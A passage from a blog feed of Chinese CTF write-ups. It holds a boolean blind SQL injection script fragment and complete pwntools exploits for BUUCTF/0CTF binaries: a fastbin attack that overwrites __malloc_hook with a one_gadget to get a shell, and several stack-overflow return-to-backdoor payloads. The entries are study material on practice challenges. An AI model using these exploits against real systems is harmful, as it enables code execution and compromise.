class="token string">'Hello'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag为:"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/10.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> bool盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/"/>
      <url>/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""></p><a id="more"></a><p>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token punctuation">;</span>    <span class="token keyword">int</span> lenth<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span>content<span class="token punctuation">;</span><span class="token punctuation">}</span>note<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span></code></pre><p>再看到Fill功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>首先判断输入的index是否位于0到15之间并且是否被分配<br>如果是的话则输入content的size<br>漏洞点就在这里，程序并没有判断content的size是否小于我们之前输入的堆的size，如果我们输入更大的size，就可以造成堆溢出</p><p>再看到Free功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>一开始还是先判断是否存在<br>然后清零所有的数据，并且指针也置NULL<br>free功能并没有漏洞</p><p>最后一个dump功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>和上面一样，先判断，然后打印对应序号的堆的内容，没啥问题</p><p>功能分析完后就开始分析漏洞点<br>Fill功能存在堆溢出漏洞，而free功能既没有UAF漏洞也没有double free漏洞，所以这题不能利用常规的通过unsorted bin来泄露libc地址的方法，而是要利用fastbin attack中的一种叫做chunk extend的方法来泄露地址，在这里贴上我看到的一个讲解的很好的链接<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin attack详解</a><br>首先把重复操作封装成函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data</code></pre><p>在本题中，按照攻击思想，首先alloc4个堆</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span></code></pre><p>alloc0x18实际上分配了0x20大小的堆，alloc0x68实际上分配了0x70大小的堆<br>然后我们fill0号堆，造成单字节溢出，即溢出到1号堆的size位，修改size为size(1)+size(2)，即0xe1(1为上一个堆是否处于分配状态的标志位)</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>这样1号堆实际上就包括了1号堆和2号堆，属于small chunk.接下来我们free1号堆，当1号堆被free之后，按照规定会被放入unsorted bin当中，大小为0xe1,此时1号堆的fd和bk指针都存放着unsorted bin的表头<br>(需要注意，free掉1号堆后，实际上2号堆仍然处于已分配状态)<br>然后我们再alloc一个大小为0x60的堆，这样就从unsorted bin当中割除一块，即割除了原本属于1号堆的那一块分配给了新堆，剩下的那一块就是属于2号堆的那一块，unsorted bin的表头的转移到了2号堆的fd和bk当中<br>而2号堆仍然处于使用状态，这样我们就可以通过dump操作泄露出libc</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>偏移为0x7f5a68c3db78-0x7f5a68879000=0x3C4B78‬</p><pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span></code></pre><p>泄露出libc地址后，利用就已经完成了一大半了<br>由于开启了Full RELRO，复写got表就不可行了，我们这里可通过覆盖__malloc_hook指针为one_gadget来起shell</p><pre class=" language-bash"><code class="language-bash">malloc_hook最常见也是最容易的一种堆利用方法。malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转通过fastbin_attack攻击malloc_hook</code></pre><p>观察一下malloc_hook周围的数据的分布<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>似乎并没有满足条件fastbin条件的数据，但只要我们稍微调整一下数据分布，看到__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7f正好满足fastbin大小的限制，如图所示<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>补充好相应的知识以后，就可以开始构造了<br>我们再alloc一个0x60大小的4号堆，实际上4号堆和2号堆是公用的<br>然后free掉2号堆，这个时候bins如下<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>我们再通过fill4号堆把2号堆的fd指针指向mallac_hook-0x23处</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>看看现在的bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>指向了<strong>malloc_hook-0x23处，我们只需要alloc2次，就能把堆分配到</strong>malloc_hook-0x23</p><pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></code></pre><p>接下来就只需要按照上面关于的<strong>malloc_hook的图进行填充即可，把one_gadget的地址填入</strong>malloc_hook处，然后再alloc任意大小的堆即可触发one_gadget从而拿到shell</p><pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io=remote('node3.buuoj.cn',29849)</span><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dataalloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>成功</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> chunk extend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn1_sctf_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p><p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26405</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x08048f0d</span>payload <span class="token operator">=</span> <span class="token string">'I'</span><span class="token operator">*</span><span class="token number">20</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup_csaw_2016</title>
      <link href="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/"/>
      <url>/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/</url>
      
        <content type="html"><![CDATA[<p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64位程序，没有保护</p><a id="more"></a><p>拖入IDA查看,F5大法<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>同样有一个后门函数，这个后门函数直接读取flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>所以做法和rip一样<br>直接贴exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./warmup_csaw_2016')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27003</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x40060d</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt=""><br>成功读取flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF rip</title>
      <link href="/LawlietLW.github.io/2020/01/23/buuctf-rip/"/>
      <url>/LawlietLW.github.io/2020/01/23/buuctf-rip/</url>
      
        <content type="html"><![CDATA[<p>入门栈溢出题目，首先checksec一下<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/1.jpg" alt=""><br>64位程序，没有任何保护</p><a id="more"></a><p>拖入IDA查看,F5大法好<br>首先是main函数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/2.jpg" alt=""><br>还有一个后门函数fun()<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/3.jpg" alt=""><br>很明显,main函数中的gets存在溢出,接下来来确定溢出字节数<br><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/4.jpg" alt=""><br>相对于EIP有23个字节<br>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#io = process('./rip')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27031</span><span class="token punctuation">)</span>fun_addr <span class="token operator">=</span> <span class="token number">0x40118a</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">23</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/01/23/buuctf-rip/5.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF CheckIn</title>
      <link href="/LawlietLW.github.io/2019/12/23/buuctf-checkin/"/>
      <url>/LawlietLW.github.io/2019/12/23/buuctf-checkin/</url>
      
